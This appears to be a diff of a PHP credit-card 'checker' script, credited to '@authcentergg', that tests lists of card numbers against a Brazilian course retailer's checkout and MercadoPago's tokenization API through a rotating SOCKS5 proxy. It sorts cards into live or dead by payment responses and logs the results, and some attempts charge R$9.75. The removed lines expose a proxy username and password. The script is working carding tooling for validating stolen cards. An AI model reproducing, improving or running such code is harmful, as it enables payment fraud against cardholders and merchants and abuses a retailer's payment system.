@@ -59,7 +59,7 @@ function saveInsuficiente($cc) {
     fclose($fp); }
 
 function saveErro($cc) {
-$file = dirname(__FILE__) . "/Informações inválidas.txt";
+$file = dirname(__FILE__) . "/ invalidas.txt";
 $fp = fopen($file, "a+");
 fwrite($fp, $cc . PHP_EOL);
 fclose($fp); }
@@ -293,10 +293,8 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true); // Incluir cabeçalhos na resposta
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -323,10 +321,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/item
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -358,10 +354,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/auth/regi
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -395,10 +389,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/cust
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -425,10 +417,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/cust
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -455,10 +445,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -488,10 +476,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/devices/widgets?pu
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: */*',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -520,10 +506,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/payment_methods/se
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: */*',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -620,10 +604,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.mercadopago.com/v1/card_tokens?public
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: */*',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -666,10 +648,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/paym
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
-curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
-curl_setopt($ch, CURLOPT_PROXYPORT, 824);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
@@ -701,58 +681,24 @@ $msg = unicode_decode($mm);
 
 
 if($msg === 'Informações inválidas'){saveErro("$lista ($msg)");
-    echo ("<span class='badge badge-danger'> ❌ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-danger'> $msg </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>"); 
-    exit();
-    curl_close($ch);
+    echo ("#INFO ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
 }
-
 if(strpos($pay,'CVV incorreto')){saveLive("Live: $lista ($msg)");
-    echo ("<span class='badge badge-success'> ✔️ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-success'> $msg </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
-    exit();
-    curl_close($ch);
+    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
 }
 elseif(strpos($pay,'Sucesso')){saveDebit("Live: $lista (R$9,75 realizado)");
-    echo ("<span class='badge badge-success'> ✔️ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-success'> Pagamento de R$9,75 realizado.</span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
-    exit();
-    curl_close($ch);
+    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [Pagamento Realizado R$ 9,75] ➜ Coder:@authcentergg"); 
 }
 elseif(strpos($pay,'Valor insuficiente')){saveInsuficiente("Live: $lista (Valor insuficiente - R$ 9,75)");
-    echo ("<span class='badge badge-success'> ✔️ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-success'> Valor insuficiente - R$ 9,75 </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
-    exit();
-    curl_close($ch);
+    echo ("#LIVE ➜ $cc|$mes|$ano2|$cvv - [Valor insuficiente R$ 9,75] ➜ Coder:@authcentergg"); 
 }
 elseif(strpos($pay,'lista negra por roubo')){
-    echo ("<span class='badge badge-danger'> ❌ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-danger'> $msg </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
-    exit();
-    curl_close($ch);
+    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
 }
 elseif(strpos($pay,'O pagamento foi rejeitado')){
-    echo ("<span class='badge badge-danger'> ❌ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-danger'> $msg </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
-    exit();
-    curl_close($ch);
+    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
 }
 else{
-    echo ("<span class='badge badge-danger'> ❌ </span>
-    <span class='badge badge-dark'> $lista </span>
-    <span class='badge badge-danger'> $msg </span>
-    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
+    echo ("#DIE ➜ $cc|$mes|$ano2|$cvv - [$msg] ➜ Coder:@authcentergg"); 
 }
 
